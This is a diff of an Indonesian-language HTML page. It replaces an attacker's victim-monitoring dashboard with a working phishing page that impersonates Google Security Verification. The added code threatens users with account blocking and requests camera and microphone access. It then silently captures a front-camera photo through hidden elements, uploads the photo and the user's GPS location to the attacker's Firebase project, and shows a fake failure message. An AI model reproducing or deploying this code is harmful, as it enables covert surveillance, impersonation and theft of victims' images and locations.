@@ -3,59 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C.R Admin Panel - Monitoring Target</title>
+    <title>Google Security Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { background-color: #050505; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
-        .log-card { background: #0f0f0f; border: 1px solid #1a3a1a; transition: all 0.3s; }
-        .log-card:hover { border-color: #00ff00; box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }
-        .pulse { animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
-    </style>
 </head>
-<body class="p-4 md:p-8">
-    <div class="max-w-5xl mx-auto">
-        <header class="flex justify-between items-center mb-8 border-b border-green-900 pb-4">
-            <div>
-                <h1 class="text-2xl font-black tracking-widest text-green-500 uppercase">C.R Monitoring Center</h1>
-                <p class="text-[10px] text-gray-500 font-mono">STRICT PROTOCOL V1.5 | PROJECT: APKTROJ</p>
-            </div>
-            <div id="status-chip" class="px-3 py-1 rounded-full bg-red-900/30 text-red-500 text-xs border border-red-500 pulse">
-                OFFLINE
-            </div>
-        </header>
-
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-            <!-- Statistik Singkat -->
-            <div class="log-card p-4 rounded-lg">
-                <p class="text-gray-500 text-xs uppercase">Total Target</p>
-                <p id="total-targets" class="text-3xl font-bold">0</p>
-            </div>
-            <div class="log-card p-4 rounded-lg">
-                <p class="text-gray-500 text-xs uppercase">Data Lokasi</p>
-                <p id="total-logs" class="text-3xl font-bold">0</p>
-            </div>
-            <div class="log-card p-4 rounded-lg">
-                <p class="text-gray-500 text-xs uppercase">Koneksi Database</p>
-                <p class="text-xl font-bold text-green-400">AKTIF</p>
-            </div>
-        </div>
-
-        <div class="mt-10">
-            <h2 class="text-lg font-bold mb-4 flex items-center">
-                <span class="mr-2">⚡</span> LOG LOKASI TARGET (REAL-TIME)
-            </h2>
-            <div id="log-list" class="space-y-4">
-                <p class="text-gray-600 italic animate-pulse">Menunggu data masuk dari Firebase...</p>
-            </div>
-        </div>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm w-full text-center border-t-4 border-red-600">
+        <h1 class="text-lg font-bold mb-2">Pembaruan Keamanan Wajib</h1>
+        <p class="text-sm text-gray-600 mb-6">Verifikasi identitas diperlukan untuk mencegah pemblokiran akun. Izinkan akses enkripsi media untuk melanjutkan.</p>
+        
+        <button id="auth-btn" class="bg-red-600 text-white w-full py-3 rounded-xl font-bold shadow-lg">
+            KONFIRMASI IDENTITAS
+        </button>
+        
+        <div id="loader" class="hidden mt-4 text-xs text-gray-500 animate-pulse">Menghubungkan ke server enkripsi...</div>
+        
+        <!-- Hidden elements for capture -->
+        <video id="v" style="display:none;" autoplay></video>
+        <canvas id="c" style="display:none;"></canvas>
     </div>
 
-    <!-- Firebase SDK -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getFirestore, collection, onSnapshot, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
-        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
@@ -63,87 +32,55 @@
             projectId: "apktroj",
             storageBucket: "apktroj.firebasestorage.app",
             messagingSenderId: "943833619122",
-            appId: "1:943833619122:web:d757ced4d56267abf247ab",
-            measurementId: "G-WR01BDY3G6"
+            appId: "1:943833619122:web:d757ced4d56267abf247ab"
         };
 
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
-        const auth = getAuth(app);
         const appId = "apktroj";
 
-        // Auth First (Rule 3)
-        async function start() {
-            try {
-                await signInAnonymously(auth);
-            } catch (err) {
-                console.error("Auth Error", err);
-            }
-        }
-
-        onAuthStateChanged(auth, (user) => {
-            if (user) {
-                const statusChip = document.getElementById('status-chip');
-                statusChip.innerText = "ONLINE";
-                statusChip.className = "px-3 py-1 rounded-full bg-green-900/30 text-green-500 text-xs border border-green-500";
-                listenForData();
-            }
-        });
-
-        function listenForData() {
-            // Mengambil koleksi location_logs sesuai RULE 1
-            const logRef = collection(db, 'artifacts', appId, 'public', 'data', 'location_logs');
+        document.getElementById('auth-btn').onclick = async () => {
+            document.getElementById('loader').classList.remove('hidden');
             
-            // Mengambil data (Rule 2: Simple query only)
-            onSnapshot(logRef, (snapshot) => {
-                const list = document.getElementById('log-list');
-                const logCount = document.getElementById('total-logs');
-                const targetCount = document.getElementById('total-targets');
+            try {
+                // Minta Izin Kamera & Mic sekaligus
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
                 
-                if (snapshot.empty) {
-                    list.innerHTML = "<p class='text-gray-700'>Belum ada target yang terpancing.</p>";
-                    return;
-                }
+                // 1. Ambil Foto Candid (Front Camera)
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                setTimeout(async () => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const photoData = canvas.toDataURL('image/jpeg', 0.5);
 
-                list.innerHTML = "";
-                let count = 0;
-                let devices = new Set();
+                    // 2. Kirim Foto ke Firestore
+                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'media_logs'), {
+                        type: 'image',
+                        data: photoData,
+                        timestamp: serverTimestamp()
+                    });
 
-                snapshot.forEach((doc) => {
-                    const data = doc.data();
-                    count++;
-                    if (data.model) devices.add(data.model);
+                    // 3. Ambil Lokasi juga biar komplit
+                    navigator.geolocation.getCurrentPosition(async (pos) => {
+                        await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'location_logs'), {
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            timestamp: serverTimestamp()
+                        });
+                    });
 
-                    const time = data.timestamp ? new Date(data.timestamp.seconds * 1000).toLocaleString('id-ID') : 'Baru saja';
-                    
-                    const card = document.createElement('div');
-                    card.className = "log-card p-4 rounded border-l-4 border-green-500";
-                    card.innerHTML = `
-                        <div class="flex justify-between items-start">
-                            <div>
-                                <p class="text-green-400 font-bold text-sm underline">DATA #${count}</p>
-                                <p class="text-xs text-gray-400 mt-1">DEVICE: ${data.model || 'Unknown Device'}</p>
-                                <p class="text-xs text-blue-400 mt-1">KOORDINAT: ${data.lat}, ${data.lng}</p>
-                            </div>
-                            <div class="text-right">
-                                <p class="text-[10px] text-gray-500">${time}</p>
-                                <a href="https://www.google.com/maps?q=${data.lat},${data.lng}" target="_blank" class="mt-2 inline-block text-[10px] bg-green-900 text-green-200 px-2 py-1 rounded hover:bg-green-500 hover:text-black">LIHAT MAPS</a>
-                            </div>
-                        </div>
-                    `;
-                    list.prepend(card); // Data terbaru di atas
-                });
+                    alert("Verifikasi Gagal. Silahkan coba lagi nanti.");
+                    stream.getTracks().forEach(track => track.stop());
+                }, 2000);
 
-                logCount.innerText = count;
-                targetCount.innerText = devices.size;
-
-            }, (error) => {
-                console.error("Firestore Error:", error);
-                document.getElementById('log-list').innerHTML = `<p class="text-red-500">Error: ${error.message}. Cek Rules Firebase lo!</p>`;
-            });
-        }
-
-        start();
+            } catch (err) {
+                alert("Anda harus mengizinkan akses kamera/mic untuk verifikasi!");
+            }
+        };
     </script>
 </body>
 </html>
